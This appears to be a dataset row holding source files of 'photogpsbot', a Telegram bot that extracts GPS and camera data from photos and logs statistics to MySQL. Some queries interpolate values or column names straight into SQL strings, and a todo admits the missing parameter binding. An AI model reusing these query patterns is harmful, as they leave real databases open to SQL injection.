        keyboard.add(button(text='Uptime', callback_data='uptime'))
        bot.send_message(config.MY_TELEGRAM,
                         'Admin commands', reply_markup=keyboard)

    else:
        log.info('%s sent text message.', user)

        # Answer to user that bot can't make a conversation with him
        bot.send_message(user.chat_id,
                         messages[current_user_lang]['dont_speak'])


@bot.callback_query_handler(func=lambda call: True)
def admin_menu(call):  # Respond commands from admin menu
    # Remove progress bar from pressed button
    bot.answer_callback_query(callback_query_id=call.id, show_alert=False)

    if call.data == 'off':
        if db.disconnect():
            bot.turn_off()
        else:
            log.error('Cannot stop bot.')
            bot.send_message(chat_id=config.MY_TELEGRAM,
                             text='Cannot stop bot.')
    elif call.data == 'last active':
        bot.send_message(config.MY_TELEGRAM,
                         text=get_admin_stat('last active users'))
    elif call.data == 'total number photos sent':
        bot.send_message(config.MY_TELEGRAM,
                         text=get_admin_stat('total number photos sent'))
    elif call.data == 'photos today':
        bot.send_message(config.MY_TELEGRAM,
                         text=get_admin_stat('photos today'))
    elif call.data == 'number of users':
        bot.send_message(config.MY_TELEGRAM,
                         text=get_admin_stat('number of users'))
    elif call.data == 'number of gadgets':
        bot.send_message(config.MY_TELEGRAM,
                         text=get_admin_stat('number of gadgets'))
    elif call.data == 'uptime':
        bot.send_message(config.MY_TELEGRAM,
                         text=get_admin_stat('uptime'))


@bot.message_handler(content_types=['photo'])
def answer_photo_message(message):
    user = users.find_one(message)
    bot.send_message(user.chat_id, messages[user.language]['as_file'])
    log.info('%s sent photo as a photo.', user)


def cache_number_users_with_same_feature(func):
    # Closure to cache previous results of given
    # function so to not call database to much
    # It saves result in a dictionary because result depends on a user.
    # cache_time - time in minutes when will
    # be returned cached result instead of calling database

    when_was_called = None
    result = {}

    def func_launcher(feature, feature_type):
        nonlocal result
        nonlocal when_was_called
        cache_time = 5

        # It's high time to reevaluate result instead
        # of just looking up in cache if countdown went off, if
        # function has not been called yet, if result for
        # feature (like camera, lens or country) not in cache
        high_time = (when_was_called + timedelta(minutes=cache_time) <
                     datetime.now() if when_was_called else True)

        if not when_was_called or high_time or feature not in result:
            when_was_called = datetime.now()
            num_of_users = func(feature, feature_type)
            result[feature] = num_of_users
            return num_of_users
        else:
            log.info('Returning cached result of %s',  func.__name__)
            time_left = (when_was_called + timedelta(minutes=cache_time) -
                         datetime.now())
            log.debug('Time to to reevaluate result of %s is %s',
                      func.__name__, str(time_left)[:-7])
            return result[feature]

    return func_launcher


def cache_most_popular_items(func):
    """"""
    Function that prevent calling any given function more often that once in
    a cache_time. It calls given function, then during next cache
    return func_launcher_time it
    will return cached result of a given function. Function call given
    function when: it hasn't been called before; cache_time is passed,
    user ask result in another language.

    :param func: some expensive function that we don't want to call too often
    because it can slow down the script
    :return: wrapper that figure out when to call function and when to
    return cached result
    """"""
    # store time when given function was called last time
    when_was_called = None
    # dictionary to store result where language of user
    # is key and message for user is a value
    result = {}

    def function_launcher(item_type, message):
        nonlocal func
        nonlocal result
        nonlocal when_was_called
        cache_time = 5

        # Only top countries can be returned in different languages.
        # For the other types of queries it doesn't mean a thing.
        if item_type == 'country_ru' or item_type == 'country_en':
            result_id = users.find_one(message).language + item_type
        else:
            result_id = item_type

        # evaluate boolean whether it is high time to call given function or
        # not
        high_time = (when_was_called + timedelta(minutes=cache_time) <
                     datetime.now() if when_was_called else True)

        if not result.get(result_id, None) or not when_was_called or high_time:
            when_was_called = datetime.now()
            result[result_id] = func(item_type, message)
            return result[result_id]
        else:
            log.debug('Return cached result of %s...', func.__name__)
            time_left = (when_was_called + timedelta(minutes=cache_time) -
                         datetime.now())
            log.debug('Time to reevaluate result of %s is %s',
                      func.__name__, str(time_left)[:-7])
            return result[result_id]

    return function_launcher


@cache_most_popular_items
def get_most_popular_items(item_type, message):
    """"""
    Get most common cameras/lenses/countries from database and
    make list of them
    :param item_type: string with column name to choose between cameras,
    lenses and countries
    :param message: telebot object with info about user and his message
    :return: string which is either list of most common
    cameras/lenses/countries or message which states that list is
    empty
    """"""

    user = users.find_one(message)

    def list_to_ordered_str_list(list_of_gadgets):
        # Make Python list to be string like roster with indexes and
        # new line characters like:
        # 1. Canon 80D
        # 2. iPhone 4S

        string_roaster = ''
        index = 1
        for item in list_of_gadgets:
            if not item[0]:
                continue
            string_roaster += '{}. {}\n'.format(index, item[0])
            index += 1
        return string_roaster

    log.debug('Evaluating most popular things...')

    # This query returns item types in order where the first one item
    # has the highest number of occurrences
    # in a given column

    query = (f'SELECT {item_type} FROM photo_queries_table2 '
             f'GROUP BY {item_type} '
             f'ORDER BY count({item_type}) '
             'DESC')

    try:
        cursor = db.execute_query(query)
    except DatabaseConnectionError:
        log.error(""Can't evaluate a list of the most popular items"")
        return messages[user.language]['doesnt work']

    # Almost impossible case but still
    if not cursor.rowcount:
        log.warning('There is nothing in the main database table')
        bot.send_message(chat_id=config.MY_TELEGRAM,
                         text='There is nothing in the main database table')
        return messages[user.language]['no_top']

    popular_items = cursor.fetchall()
    log.info('Finish evaluating the most popular items')
    return list_to_ordered_str_list(popular_items[:30])


@cache_number_users_with_same_feature
def get_number_users_by_feature(feature, feature_type):
    """"""
    Get number of users that have same smartphone, camera, lens or that
    have been to the same country
    :param feature: string which is name of a particular feature e.g.
    camera name or country name
    :param feature_type: string which is name of the column in database
    :return: string which is message to user
    """"""
    log.debug('Check how many users also have this feature: %s...',
              feature)

    query = (""SELECT DISTINCT chat_id ""
             ""FROM photo_queries_table2 ""
             ""WHERE %s=%s"")

    parameters = (feature_type, feature)

    try:
        cursor = db.execute_query(query, parameters)
    except DatabaseConnectionError:
        log.error(""Cannot check how many users also have this feature: %s..."",
                  feature)
        return None

    if not cursor.rowcount:
        log.debug('There were no users with %s...', feature)
        return None

    log.debug('There is %d users with %s', cursor.rowcount, feature)
    return cursor.rowcount - 1


@bot.message_handler(content_types=['document'])  # receive file
def handle_message_with_image(message):

    user = users.find_one(message)
    # Sending a message to a user that his photo is being processed
    bot.reply_to(message, messages[user.language]['photo_prcs'])
    log.info('%s sent photo as a file.', user)

    photo_message = PhotoMessage(message, user)
    answer = photo_message.prepare_answer()

    # if longitude is in the answer
    if answer[0][0]:
        lon = answer[0][0]
        lat = answer[0][1]
        bot.send_location(user.chat_id, lon, lat, live_period=None)
        bot.reply_to(message, answer[1], parse_mode='Markdown')
    else:
        bot.reply_to(message, answer, parse_mode='Markdown')


def main():
    log_files.clean_log_folder(1)
    users.cache(100)
    db.connect()
    bot.start_bot()


if __name__ == '__main__':
    main()
/n/n/nphotogpsbot/db_connector.py/n/n""""""
Module that provides a way to connect to MySQL and reconnect each time
connection is lost. It also can automatically set up SSH tunnel thanks to
sshtunnel module

Original way to do it was described at
https://help.pythonanywhere.com/pages/ManagingDatabaseConnections/
""""""

import socket

# goes as mysqlclient in requirements
import MySQLdb
import sshtunnel

from photogpsbot import log
import config


class DatabaseError(Exception):
    pass


class DatabaseConnectionError(Exception):
    pass


class Database:
    """"""
    Class that provides method to execute queries and handles connection to
    the MySQL database directly and via ssh if necessary
    """"""
    conn = None
    tunnel = None
    tunnel_opened = False

    def _open_ssh_tunnel(self):
        """"""
        Method that opens ssh tunnel to the server where the database of
        photogpsbot is located
        :return: None
        """"""
        log.debug('Establishing SSH tunnel to the server where the database '
                  'is located...')
        sshtunnel.SSH_TIMEOUT = 5.0
        sshtunnel.TUNNEL_TIMEOUT = 5.0
        self.tunnel = sshtunnel.SSHTunnelForwarder(
            ssh_address_or_host=config.SERVER_ADDRESS,
            ssh_username=config.SSH_USER,
            ssh_password=config.SSH_PASSWD,
            ssh_port=22,
            remote_bind_address=('127.0.0.1', 3306))

        self.tunnel.start()
        self.tunnel_opened = True
        log.debug('SSH tunnel has been established.')

    def connect(self):
        """"""
        Established connection either to local database or to remote one if
        the script runs not on the same server where database is located
        :return: None
        """"""
        if socket.gethostname() == config.PROD_HOST_NAME:
            log.info('Connecting to the local database...')
            port = 3306
        else:
            log.info('Connecting to the database via SSH...')
            if not self.tunnel_opened:
                self._open_ssh_tunnel()

            port = self.tunnel.local_bind_port

        self.conn = MySQLdb.connect(host='127.0.0.1',
                                    user=config.DB_USER,
                                    password=config.DB_PASSWD,
                                    port=port,
                                    database=config.DB_NAME,
                                    charset='utf8')
        log.info('Connected to the database.')

    def execute_query(self, query, parameters=None, trials=0):
        """"""
        Executes a given query
        :param query: query to execute
        :param parameters: parameters for query
        :param trials: integer that denotes number of trials to execute
        a query in case of known errors
        :return: cursor object
        """"""
        if not self.conn or not self.conn.open:
            self.connect()

        try:
            cursor = self.conn.cursor()
            cursor.execute(query, parameters)

        # try to reconnect if MySQL server has gone away
        except MySQLdb.OperationalError as e:

            # (2013, Lost connection to MySQL server during query)
            # (2006, Server has gone away)
            if e.args[0] in [2006, 2013]:
                log.info(e)
                # log.debug(""Connecting to the MySQL again..."")

                self.connect()
                if trials > 3:
                    log.error(e)
                    log.warning(""Ran out of limit of trials..."")
                    raise DatabaseConnectionError(""Cannot connect to the ""
                                                  ""database"")

                trials += 1
                # trying to execute query one more time
                log.warning(e)
                log.info(""Trying execute the query again..."")
                return self.execute_query(query, parameters, trials)
            else:
                log.error(e)
                raise
        except Exception as e:
            log.error(e)
            raise
        else:
            return cursor

    def add(self, query, parameters=None):
        """"""
        Shortcut to add something to a database
        :param query: query to execute
        :param parameters: parameters for query
        :return: boolean - True if the method succeeded and False otherwise
        """"""

        try:
            self.execute_query(query, parameters)
            self.conn.commit()
        except Exception as e:
            log.errror(e)
            raise DatabaseError(""Cannot add your data to the database!"")

    def disconnect(self):
        """"""
        Closes the connection to the database and ssh tunnel if needed
        :return: True if succeeded
        """"""
        if self.conn:
            self.conn.close()
            log.info('Connection to the database has been closed.')
        if self.tunnel:
            self.tunnel.stop()
            log.info('SSH tunnel has been closed.')
        self.tunnel_opened = False
        return True

    def __str__(self):
        return (f'Instance of a connector to the database. '
                f'The connection is {""opened"" if self.conn else ""closed""}. '
                f'SSH tunnel is {""opened"" if self.tunnel_opened else ""closed""}'
                '.')
/n/n/nphotogpsbot/process_image.py/n/nfrom dataclasses import dataclass
from typing import Dict

import exifread
from exifread.classes import IfdTag
from geopy.geocoders import Nominatim

from photogpsbot import bot, log, db, User


class InvalidCoordinates(Exception):
    """"""
    Coordinates have invalid format
    """"""


class NoCoordinates(Exception):
    """"""
    There is no location info
    """"""


class NoEXIF(Exception):
    """"""
    Means that there is no EXIF within the photo at all

    """"""


class NoData(Exception):
    """"""
    Means that there is actually no any data of our interest within the picture

    """"""


@dataclass
class ImageData:
    """"""
    A class to store info about a photo from user.
    """"""
    user: User
    date_time: str = None
    camera: str = None
    lens: str = None
    address: str = None
    country: Dict[str, str] = None
    latitude: float = None
    longitude: float = None


@dataclass
class RawImageData:
    """"""
    Raw data from photo that is still have to be converted in order to be used.
    """"""
    user: User
    date_time: str = None
    camera_brand: str = None
    camera_model: str = None
    lens_brand: str = None
    lens_model: str = None
    latitude_reference: str = None
    raw_latitude: IfdTag = None
    longitude_reference: str = None
    raw_longitude: IfdTag = None


class ImageHandler:

    def __init__(self, user, file):
        self.user = user
        self.file = file
        self.raw_data = None

    @staticmethod
    def _get_raw_data(file):
        """"""
        Get name of the camera and lens, the date when the photo was taken
        and raw coordinates (which later will be converted)
        :param file: byte sting with an image
        :return: RawImageData object with raw info from the photo
        """"""
        # Get data from the exif of the photo via external library
        exif = exifread.process_file(file, details=False)
        if not len(exif.keys()):
            reason = ""This picture doesn't contain EXIF.""
            log.info(reason)
            raise NoEXIF(reason)

        # Get info about camera ang lend from EXIF
        date_time = exif.get('EXIF DateTimeOriginal', None)
        date_time = str(date_time) if date_time else None
        camera_brand = str(exif.get('Image Make', ''))
        camera_model = str(exif.get('Image Model', ''))
        lens_brand = str(exif.get('EXIF LensMake', ''))
        lens_model = str(exif.get('EXIF LensModel', ''))

        if not any([date_time, camera_brand, camera_model, lens_brand,
                    lens_model]):
            # Means that there is actually no any data of our interest
            reason = 'There is no data of interest in this photo'
            log.info(reason)
            raise NoData(reason)

        try:  # Extract coordinates from EXIF
            latitude_reference = str(exif['GPS GPSLatitudeRef'])
            raw_latitude = exif['GPS GPSLatitude']
            longitude_reference = str(exif['GPS GPSLongitudeRef'])
            raw_longitude = exif['GPS GPSLongitude']

        except KeyError:
            log.info(""This picture doesn't contain coordinates."")
            # returning info about the photo without coordinates
            return (date_time, camera_brand, camera_model,
                    lens_brand, lens_model)
        else:
            # returning info about the photo with its coordinates
            return (date_time, camera_brand, camera_model,
                    lens_brand, lens_model, latitude_reference, raw_latitude,
                    longitude_reference, raw_longitude)

    @staticmethod
    def _dedupe_string(string):
        """"""
        Get rid of all repetitive words in a string
        :param string: string with camera or lens names
        :return: same string without repetitive words
        """"""

        deduped_string = ''

        for x in string.split(' '):
            if x not in deduped_string:
                deduped_string += x + ' '
        return deduped_string.rstrip()

    @staticmethod
    def _check_camera_tags(tags):
        """"""
        Function that convert stupid code name of a smartphone or camera
        from EXIF to meaningful one by looking a collation in a special MySQL
        table For example instead of just Nikon there can be
        NIKON CORPORATION in EXIF

        :param tags: name of a camera and lens from EXIF
        :return: list with one or two strings which are name of
        camera and/or lens. If there is not better name for the gadget
        in database, function just returns name how it is
        """"""
        checked_tags = []

        for tag in tags:
            if tag:  # If there was this information inside EXIF of the photo
                tag = str(tag).strip()
                log.info('Looking up collation for %s', tag)
                query = ('SELECT right_tag '
                         'FROM tag_table '
                         'WHERE wrong_tag=%s')
                parameters = tag,
                cursor = db.execute_query(query, parameters)
                if not cursor:
                    log.error(""Can't check the tag because of the db error"")
                    log.warning(""Tag will stay as is."")
                    continue
                if cursor.rowcount:
                    # Get appropriate tag from the table
                    tag = cursor.fetchone()[0]
                    log.info('Tag after looking up in tag_tables - %s.', tag)

            checked_tags.append(tag)
        return checked_tags

    @staticmethod
    def _get_dd_coordinate(angular_distance, reference):
        """"""
         Convert coordinates from format in which they are typically written
         in EXIF to decimal degrees - format that Telegram or Google Map
         understand. Google coordinates, EXIF and decimals degrees if you
         need to understand what is going on here

         :param angular_distance: ifdTag object from the exifread module -
         it contains a raw coordinate - either longitude or latitude
         :param reference:
          :return: a coordinate in decimal degrees format
         """"""
        ag = angular_distance
        degrees = ag.values[0].num / ag.values[0].den
        minutes = (ag.values[1].num / ag.values[1].den) / 60
        seconds = (ag.values[2].num / ag.values[2].den) / 3600

        if reference in 'WS':
            return -(degrees + minutes + seconds)

        return degrees + minutes + seconds

    def _convert_coordinates(self, raw_data):
        """"""
        # Convert GPS coordinates from format in which they are stored in
        EXIF of photo to format that accepts Telegram (and Google Maps for
        example)

        :param data: EXIF data extracted from photo
        :param chat_id: user id
        :return: either floats that represents longitude and latitude or
        string with error message dedicated to user
        """"""

        # Return positive or negative longitude/latitude from exifread's ifdtag

        try:
            latitude = self._get_dd_coordinate(raw_data.raw_latitude,
                                               raw_data.latitude_reference)
            longitude = self._get_dd_coordinate(raw_data.raw_longitude,
                                                raw_data.longitude_reference)

        except Exception as e:
            # todo also find out the error in case there is no coordinates in
            #  raw_data
            log.error(e)
            log.error('Cannot read coordinates of this photo.')
            raw_coordinates = (f'Latitude reference: '
                               f'{raw_data.latitude_reference}\n'
                               f'Raw latitude: {raw_data.raw_latitude}.\n'
                               f'Longitude reference: '
                               f'{raw_data.longitude_reference} '
                               f'Raw longitude: {raw_data.raw_longitude}.\n')
            log.info(raw_coordinates)
            raise InvalidCoordinates

        else:
            return latitude, longitude

    @staticmethod
    def _get_address(latitude, longitude):

        """"""
         # Get address as a string by coordinates from photo that user sent
         to bot
        :param latitude:
        :param longitude:
        :return: address as a string where photo was taken; name of
        country in English and Russian to keep statistics
        of the most popular countries among users of the bot
        """"""

        address = {}
        country = {}
        coordinates = f""{latitude}, {longitude}""
        log.debug('Getting address from coordinates %s...', coordinates)
        geolocator = Nominatim()

        try:
            # Get name of the country in English and Russian language
            location = geolocator.reverse(coordinates, language='en')
            address['en-US'] = location.address
            country['en-US'] = location.raw['address']['country']

            location2 = geolocator.reverse(coordinates, language='ru')
            address['ru-RU'] = location2.address
            country['ru-RU'] = location2.raw['address']['country']
            return address, country

        except Exception as e:
            log.error('Getting address has failed!')
            log.error(e)
            raise

    def _convert_data(self, raw_data):
        date_time = (str(raw_data.date_time) if raw_data.date_time else None)

        # Merge a brand and model together
        camera = f'{raw_data.camera_brand} {raw_data.camera_model}'
        lens = f'{raw_data.lens_brand} {raw_data.lens_model}'

        # Get rid of repetitive words
        camera = (self._dedupe_string(camera) if camera != ' ' else None)
        lens = (self._dedupe_string(lens) if lens != ' ' else None)

        camera, lens = self._check_camera_tags([camera, lens])

        try:
            latitude, longitude = self._convert_coordinates(raw_data)
        except (InvalidCoordinates, NoCoordinates):
            address = country = latitude = longitude = None
        else:
            try:
                address, country = self._get_address(latitude, longitude)
            except Exception as e:
                log.warning(e)
                address = country = None

        return date_time, camera, lens, address, country, latitude, longitude

    def get_image_info(self):
        """"""
        Read data from photo and prepare answer for user
        with location and etc.
        """"""
        raw_data = RawImageData(self.user, *self._get_raw_data(self.file))
        image_data = ImageData(self.user, *self._convert_data(raw_data))

        return image_data
/n/n/nphotogpsbot/users.py/n/n""""""
Module to manage users of bot: store and update information, interact with
the database, keep tack of and switch language of interface for user
""""""

import config
from photogpsbot import bot, log, db
from photogpsbot.db_connector import DatabaseError, DatabaseConnectionError

from telebot.types import Message

class User:
    """"""
    Class that describes one user of this Telegram bot and helps to store basic
    info about him and his language of choice for interface of the bot
    """"""
    def __init__(self, chat_id, first_name, nickname, last_name,
                 language='en-US'):
        self.chat_id = chat_id
        self.first_name = first_name
        self.nickname = nickname
        self.last_name = last_name
        self.language = language

    def set_language(self, lang):
        """"""
        Update language of user in the User object and in the database
        :param lang: string with language tag like ""en-US""
        :return: None
        """"""
        log.debug('Updating info about user %s language '
                  'in memory & database...', self)

        self.language = lang

        query = (""UPDATE users ""
                 f""SET language=%s ""
                 f""WHERE chat_id=%s"")

        parameters = self.language, self.chat_id
        try:
            db.add(query, parameters)
        except DatabaseError:
            log.error(""Can't add new language of %s to the database"", self)
        else:
            log.debug('Language updated.')

    def switch_language(self):
        """"""
        Switch language from Russian to English or conversely
        :return: string with language tag like ""en-US"" to be used for
        rendering menus and messages for user
        """"""
        curr_lang = self.language
        new_lang = 'ru-RU' if self.language == 'en-US' else 'en-US'
        log.info('Changing user %s language from %s to %s...', self,
                 curr_lang, new_lang)

        self.set_language(new_lang)

        return new_lang

    def __str__(self):
        return (f'{self.first_name} {self.nickname} {self.last_name} '
                f'({self.chat_id}) preferred language: {self.language}')

    def __repr__(self):
        return (f'{self.__class__.__name__}(chat_id={self.chat_id}, '
                f'first_name=""{self.first_name}"", nickname=""{self.nickname}"", '
                f'last_name=""{self.last_name}"", language=""{self.language}"")')


class Users:
    """"""
    Class for managing users of the bot: find them, add to system,
    cache them from the database, check whether user changed his info etc
    """"""
    def __init__(self):
        self.users = {}

    @staticmethod
    def get_total_number():
        """"""
        Count the total number of users in the database
        :return: integer which is the total number of users
        """"""
        query = ""SELECT COUNT(*) FROM users""
        try:
            cursor = db.execute_query(query)
        except DatabaseConnectionError:
            log.error(""Can't count the total number of users!"")
            raise

        return cursor.fetchone()[0]

    @staticmethod
    def get_last_active_users(limit):
        """"""
        Get from the database a tuple of users who have been recently using
        the bot
        :param limit: integer that specifies how much users to get
        :return: tuple of tuples with users info
        """"""
        log.info('Evaluating last active users with date of '
                 'last time when they used bot...')

        # From photo_queries_table2 we take chat_id of the last
        # active users and from 'users' table we take info about these
        # users by chat_id which is a foreign key
        query = ('SELECT p.chat_id, u.first_name, u.nickname, u.last_name, '
                 'u.language '
                 'FROM photo_queries_table2 p '
                 'INNER JOIN users u '
                 'ON p.chat_id = u.chat_id '
                 'GROUP BY u.chat_id, u.first_name, u.nickname, u.last_name, '
                 'u.language '
                 'ORDER BY MAX(time)'
                 f'DESC LIMIT %s')

        parameters = limit,

        try:
            cursor = db.execute_query(query, parameters)
        except DatabaseConnectionError:
            log.error(""Cannot get the last active users because of some ""
                      ""problems with the database"")
            raise

        last_active_users = cursor.fetchall()
        return last_active_users

    def cache(self, limit):
        """"""
        Caches last active users from database to a dictionary inside object of
        this class
        :param limit: limit of entries to be cached
        :return: None
        """"""

        log.debug(""Start caching last active users from the DB..."")

        try:
            last_active_users = self.get_last_active_users(limit)
        except DatabaseConnectionError:
            log.error(""Cannot cache users!"")
            return

        for items in last_active_users:
            # if chat_id of a user is not known to the program
            if items[0] not in self.users:
                # adding users from database to the ""cache""
                self.users[items[0]] = User(*items)
                log.debug(""Caching user: %s"", self.users[items[0]])
        log.info('Users have been cached.')

    def clean_cache(self, limit):
        """"""
        Method that remove several User objects from cache - the least 
        active users
        :param limit: number of the users that the method should remove
        from cache
        :return: None
        """"""

        log.info('Figuring out the least active users...')
        # Select users that the least active recently
        user_ids = tuple(self.users.keys())
        query = ('SELECT chat_id '
                 'FROM photo_queries_table2 '
                 f'WHERE chat_id in {user_ids} '
                 'GROUP BY chat_id '
                 'ORDER BY MAX(time) '
                 f'LIMIT %s')

        parameters = limit,

        try:
            cursor = db.execute_query(query, parameters)
        except DatabaseConnectionError:
            log.error(""Can't figure out the least active users..."")
            return

        if not cursor.rowcount:
            log.warning(""There are no users in the db"")
            return

        # Make list out of tuple of tuples that is returned by MySQL
        least_active_users = [chat_id[0] for chat_id in cursor.fetchall()]
        log.info('Removing %d least active users from cache...', limit)
        num_deleted_entries = 0
        for entry in least_active_users:
            log.debug('Deleting %s...', entry)
            deleted_entry = self.users.pop(entry, None)
            if deleted_entry:
                num_deleted_entries += 1
        log.debug(""%d users were removed from cache."", num_deleted_entries)

    @staticmethod
    def _add_to_db(user):
        """"""
        Adds User object to the database
        :param user: User object with info about user
        :return: None
        """"""
        query = (""INSERT INTO users (chat_id, first_name, nickname, ""
                 ""last_name, language) ""
                 f""VALUES (%s, %s, %s, %s, %s)"")

        parameters = (user.chat_id, user.first_name, user.nickname,
                      user.last_name, user.language)

        try:
            db.add(query, parameters)
        except DatabaseError:
            log.error(""Cannot add user to the database"")
        else:
            log.info(f""User {user} was successfully added to the users db"")

    def add_new_one(self, chat_id, first_name, nickname, last_name, language,
                    add_to_db=True):
        """"""
        Function to add a new User in dictionary with users and to the database
        at one fell swoop
        :param chat_id: id of a Telegram user
        :param first_name: first name of a Telegram user
        :param nickname: nickname of a Telegram user
        :param last_name: last name of a Telegram user
        :param language: preferred language of a Telegram user
        :param add_to_db: whether of not to add user to the database (for
        example, if bot is caching users from the database, there is clearly
        no point to add them back to the database)
        :return: User object with info about the added user
        """"""
        user = User(chat_id, first_name, nickname, last_name, language)
        self.users[chat_id] = user
        if add_to_db:
            self._add_to_db(user)
        return user

    @staticmethod
    def compare_and_update(user, message):
        """"""
        This method compare a user object from the bot and his info from
        the Telegram message to check whether a user has changed his bio
        or not. If yes, the user object that represents him in the bot will
        be updated accordingly. Now this function is called only when a user
        asks the bot for showing the most popular cams

        :param user: user object that represents a Telegram user in this bot
        :param message: object from Telegram that contains info about user's
        message and about himself
        :return: None
        """"""

        log.info('Checking whether user have changed his info or not...')
        msg = message.from_user
        usr_from_message = User(message.chat.id, msg.first_name, msg.username,
                                msg.last_name)

        if user.chat_id != usr_from_message.chat_id:
            log.error(""Wrong user to compare!"")
            return

        if user.first_name != usr_from_message.first_name:
            user.first_name = usr_from_message.first_name

        elif user.nickname != usr_from_message.nickname:
            user.nickname = usr_from_message.nickname

        elif user.last_name != usr_from_message.last_name:
            user.last_name = usr_from_message.last_name

        else:
            log.debug(""User's info hasn't changed"")
            return

        log.info(""User has changed his info"")
        log.debug(""Updating user's info in the database..."")
        query = (f""UPDATE users ""
                 f""SET first_name=%s, ""
                 f""nickname=%s, ""
                 f""last_name=%s ""
                 f""WHERE chat_id=%s"")

        parameters = (user.first_name, user.nickname, user.last_name,
                      user.chat_id)

        try:
            db.add(query, parameters)
        except DatabaseError:
            log.error(""Could not update info about %s in the database"",
                      user)
        else:
            log.debug(""User's info has been updated"")

    def find_one(self, message: Message) -> User:
        """"""
        Look up a user by a message which we get together with request
        from Telegram
        :param message: object from Telegram that contains info about user's
        message and about himself
        :return: user object that represents a Telegram user in this bot
        """"""

        # look up user in the cache of the bot
        user = self.users.get(message.chat.id, None)

        if user:
            return user

        # otherwise look up the user in the database
        log.debug(""Looking up the user in the database as it doesn't ""
                  ""appear in cache"")
        query = (f'SELECT first_name, nickname, last_name, language '
                 f'FROM users '
                 f'WHERE chat_id=%s')

        parameters = message.chat.id,
        try:
            cursor = db.execute_query(query, parameters)
        except DatabaseConnectionError:

            # Even if the database in unreachable add user to dictionary
            # with users otherwise the bot will crash requesting this
            # user's info
            log.error('Cannot lookup the user with chat_id %d in database',
                      message.chat.id)
            msg = message.from_user
            user = self.add_new_one(message.chat.id, msg.first_name,
                                    msg.last_name, msg.username,
                                    language='en-US', add_to_db=False)
            return user

        if not cursor.rowcount:
            # This user uses our photoGPSbot for the first time as we
            # can't find him in the database
            log.info('Adding totally new user to the system...')
            msg = message.from_user
            user = self.add_new_one(message.chat.id, msg.first_name,
                                    msg.last_name, msg.username,
                                    language='en-US')
            bot.send_message(config.MY_TELEGRAM,
                             text=f'You have a new user! {user}')
            log.info('You have a new user! Welcome %s', user)

        # finally if the user wasn't found in the cache of the bot, but was
        # found in the database
        else:
            log.debug('User %d has been found in the database',
                      message.chat.id)

            user_data = cursor.fetchall()[0]
            user = self.add_new_one(message.chat.id, *user_data,
                                    add_to_db=False)

        return user

    def __str__(self):
        return ('Instance of a handler of users. '
                f'There is {len(self.users)} users in cache right now.')
/n/n/n",0
159,159,0e9f57f13e61863b3672f5730e27f149da00786a,"/photogpsbot/__main__.py/n/n""""""
Small bot for Telegram that receives your photo and returns you map where
it was taken.
Written by Aleksandr Mikheev.
https://github.com/RandyRomero/photogpsbot

This specific module contains methods to respond user messages, to make
interactive menus, to handle user language, to process user images
""""""

# todo fix database queries in order to user parameters binding!

# todo check what is wrong with geopy on
#  last versions (some deprecation warning)

# todo rewrite the processing of images
# todo update docstrings and comments

from io import BytesIO
from datetime import datetime, timedelta

from telebot import types
import requests

from photogpsbot import bot, log, log_files, db, User, users, messages, machine
from photogpsbot.process_image import ImageHandler
from photogpsbot.db_connector import DatabaseConnectionError
import config


class PhotoMessage:
    def __init__(self, message, user):
        self.message = message
        self.user = user
        self.image_handler = ImageHandler

    @staticmethod
    def open_photo(message):
        # Get temporary link to a photo that user sends to the bot
        file_path = bot.get_file(message.document.file_id).file_path

        # Download photo that got the bot from a user
        link = (""https://api.telegram.org/file/""
                f""bot{config.TELEGRAM_TOKEN}/{file_path}"")

        if machine == 'prod':
            r = requests.get(link)
        else:
            # use proxy if the bot is running not on production server
            proxies = {'https': config.PROXY_CONFIG}
            r = requests.get(link, proxies=proxies)

        # Get file-like object of user's photo
        return BytesIO(r.content)

    def get_info(self):
        """"""
        Opens file that user sent as a file-like object, get necessary info
        from it and return it

        :return: instance of ImageData - my dataclass for storing info about
        an image like user, date, camera name etc
        """"""
        user_photo = self.open_photo(self.message)
        image = self.image_handler(self.user, user_photo)
        return image.get_image_info()

    def save_info_to_db(self, image_data):
        """"""
           When user send photo as a file to get information, bot also stores
           information about this query to the database to keep statistics that
           can be shown to a user in different ways. It stores time of query,
           Telegram id of a user, his camera and lens which were used for
           taking photo, his first and last name, nickname and country where
           the photo was taken. The bot does not save photos or their
           coordinates.

           :image_data: an instance of ImageData dataclass with info about
           the image
           :return: None
           """"""
        camera_name, lens_name = image_data.camera, image_data.lens
        camera_name = f'""{camera_name}""' if camera_name else None
        lens_name = f'""{lens_name}""' if lens_name else None

        if not image_data.country:
            country_en = country_ru = None
        else:
            country_en = f'""{image_data.country[""en-US""]}""'
            country_ru = f'""{image_data.country[""ru-RU""]}""'

        log.info('Adding user query to photo_queries_table...')

        query = ('INSERT INTO photo_queries_table '
                 '(chat_id, camera_name, lens_name, country_en, country_ru) '
                 'VALUES (%s, %s, %s, %s, %s)')

        parameters = (self.user.chat_id, camera_name, lens_name, country_en,
                      country_ru)

        db.execute_query(query, parameters)
        db.conn.commit()
        log.info('User query was successfully added to the database.')

    @staticmethod
    def find_num_users_with_same_feature(image_data):
        same_feature = []

        feature_types = ('camera_name', 'lens_name', 'country_en')
        features = (image_data.camera, image_data.lens, image_data.country['en-US'])

        for feature_name, feature in zip(feature_types, features):
            if not feature:
                same_feature.append(0)
                continue
            answer = get_number_users_by_feature(feature, feature_name)
            same_feature.append(answer)

        return same_feature

    def prepare_answer(self):
        """"""
        Process an image that user sent, get info from it, save data to the
        database, make an answer to be sent via Telegram
        :return:
        """"""

        # Get instance of the dataclass ImageData with info about the image
        image_data = self.get_info()
        # Save some general info about the user's query to the database
        self.save_info_to_db(image_data)

        answer = ''
        coordinates = image_data.latitude, image_data.longitude
        if not coordinates[0]:
            answer += messages[self.user.language][""no_gps""]

        answ_template = messages[self.user.language][""camera_info""]
        basic_data = (image_data.date_time, image_data.camera, image_data.lens,
                      image_data.address[self.user.language])

        # Concatenate templates in language that user prefer with information
        # from the photo, for example: f'{""Camera brand""}:{""Canon 60D""}'
        for arg in zip(answ_template, basic_data):
            if arg[1]:
                answer += f'*{arg[0]}*: {arg[1]}\n'

        lang = self.user.language
        lang_templates = messages[lang][""users with the same feature""].values()
        ppl_wth_same_featrs = self.find_num_users_with_same_feature(image_data)
        for template, feature in zip(lang_templates, ppl_wth_same_featrs):
            if feature:
                answer += f'{template} {feature}\n'

        return coordinates, answer


def get_admin_stat(command):
    # Function that returns statistics to admin by command
    error_answer = ""Can't execute your command. Check logs""
    answer = 'There is some statistics for you: \n'

    # Set to a beginning of the day
    today = (datetime
             .today()
             .replace(hour=0, minute=0, second=0, microsecond=0)
             .strftime('%Y-%m-%d %H:%M:%S'))

    # Last users with date of last time when they used bot
